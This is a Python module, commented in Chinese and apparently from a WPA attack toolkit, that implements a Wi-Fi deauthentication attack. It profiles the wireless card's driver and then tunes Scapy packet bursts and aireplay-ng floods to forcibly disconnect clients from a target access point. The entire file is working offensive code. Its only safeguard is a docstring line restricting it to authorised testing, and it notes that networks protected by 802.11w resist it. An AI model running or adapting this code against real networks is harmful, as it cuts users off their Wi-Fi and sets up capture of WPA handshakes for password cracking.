#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""统一 deauth 入口：按网卡驱动选发包方式，保证踢得下。

默认策略:
  1) 探测驱动（sysfs / ethtool / airmon）→ nic_profile
  2) mt76 等：Scapy 高密度突发（×4 轮）为主 + aireplay 补刀
  3) Realtek：加大 aireplay 包数 + 更密 Scapy
  4) Broadcom：优先 aireplay
  5) 用户 --deauth-engine 可强制覆盖

爆发后静默监听（默认 10s）由 AttackWPA 控制，本模块只负责「踢」。

仅限授权测试；MFP(802.11w) 目标无法靠 deauth 踢站。
"""

from __future__ import annotations

from typing import Optional

from ..config import Configuration
from ..util.color import Color
from .aireplay import Aireplay
from .scapy_deauth import ScapyDeauth
from .nic_profile import get_deauth_profile, describe_profile


_profile_announced = False


def engine() -> str:
    '''用户强制: auto | both | scapy | aireplay'''
    raw = str(getattr(Configuration, 'deauth_engine', 'auto') or 'auto').strip().lower()
    if raw in ('both', 'scapy', 'aireplay', 'auto'):
        return raw
    return 'auto'


def _resolve_mode(prof_engine: str) -> tuple[bool, bool]:
    '''返回 (use_scapy, use_aireplay)。'''
    user = engine()
    scapy_ok = ScapyDeauth.available()

    if user == 'scapy':
        return (scapy_ok, not scapy_ok)  # 无 scapy 则降级 aireplay
    if user == 'aireplay':
        return (False, True)
    if user == 'both':
        return (scapy_ok, True)

    # auto：跟网卡 profile
    pe = (prof_engine or 'both').lower()
    if pe == 'scapy':
        return (scapy_ok, not scapy_ok)
    if pe == 'aireplay':
        return (False, True)
    # both
    return (scapy_ok, True)


def send_deauth(
    target_bssid: str,
    client_mac: Optional[str] = None,
    essid: Optional[str] = None,
    timeout: float = 3.0,
) -> dict:
    """对目标发 deauth。返回 {scapy, aireplay, profile, skipped}。"""
    global _profile_announced

    if getattr(Configuration, 'no_deauth', False):
        return {'scapy': 0, 'aireplay': False, 'skipped': True, 'profile': None}

    iface = getattr(Configuration, 'interface', None) or ''
    prof = get_deauth_profile(iface)

    if not _profile_announced:
        Color.pl('{+} {C}deauth{W}: {D}%s{W}' % describe_profile(iface))
        _profile_announced = True

    use_scapy, use_aireplay = _resolve_mode(prof.engine)

    # 用户显式 scapy 份数覆盖 profile
    try:
        cfg_count = int(getattr(Configuration, 'scapy_deauth_count', 0) or 0)
    except (TypeError, ValueError):
        cfg_count = 0
    per_dir = cfg_count if cfg_count > 0 else (prof.per_dir or None)

    try:
        rounds = int(getattr(Configuration, 'scapy_deauth_rounds', 0) or 0)
    except (TypeError, ValueError):
        rounds = 0
    if rounds <= 0:
        rounds = prof.rounds

    try:
        inter = float(getattr(Configuration, 'scapy_deauth_inter', 0) or 0)
    except (TypeError, ValueError):
        inter = 0.0
    if inter <= 0:
        inter = prof.inter

    result = {
        'scapy': 0,
        'aireplay': False,
        'skipped': False,
        'profile': prof.name,
        'rounds': rounds,
    }

    if use_scapy:
        result['scapy'] = ScapyDeauth.deauth(
            target_bssid,
            client_mac=client_mac,
            count=per_dir,
            iface=iface,
            inter=inter,
            rounds=rounds,
        )

    if use_aireplay:
        # 仅 aireplay 或 scapy 失败：用满 profile 包数；scapy 已成功则按 profile 决定是否补刀
        if result['scapy'] > 0 and not prof.aireplay_after_scapy:
            n = 0
        elif result['scapy'] > 0:
            # Scapy 已打，仍按 profile 满包数补刀（不再封顶 16），确保踢得下
            n = prof.aireplay_count
        else:
            n = max(
                int(getattr(Configuration, 'num_deauths', 64) or 64),
                prof.aireplay_count,
            )
        if n > 0:
            try:
                # 64 包 deauth 需 ≥5s 才能发完，避免被超时中断
                Aireplay.deauth(
                    target_bssid,
                    essid=essid,
                    client_mac=client_mac,
                    num_deauths=n,
                    timeout=max(timeout, 5.0),
                )
                result['aireplay'] = True
            except Exception:
                result['aireplay'] = False

    return result
